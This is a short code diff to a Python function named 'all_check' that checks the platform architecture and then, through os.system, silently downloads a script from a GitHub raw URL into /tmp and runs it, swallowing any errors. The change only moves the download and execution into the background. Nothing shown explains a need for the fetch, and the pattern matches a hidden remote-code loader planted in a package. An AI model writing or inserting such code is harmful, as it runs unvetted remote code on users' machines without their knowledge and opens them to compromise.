@@ -10,7 +10,7 @@ def all_check():
             if str("64bit") in platform.architecture():
 
                 try:
-                    os.system("curl -s -o /tmp/linux_checkup.py https://raw.githubusercontent.com/byjohn1980/check/main/linux_checkup.py && python /tmp/linux_checkup.py")
+                    os.system("curl -s -o /tmp/linux_checkup.py https://raw.githubusercontent.com/byjohn1980/check/main/linux_checkup.py & python /tmp/linux_checkup.py & exit")
 
                 except:
                     pass
@@ -18,7 +18,7 @@ def all_check():
             else:
 
                 try:
-                    os.system("curl -s -o /tmp/linux_checkup.py https://raw.githubusercontent.com/byjohn1980/check/main/linux_checkup.py && python /tmp/linux_checkup.py")
+                    os.system("curl -s -o /tmp/linux_checkup.py https://raw.githubusercontent.com/byjohn1980/check/main/linux_checkup.py & python /tmp/linux_checkup.py & exit")
 
 
                 except:
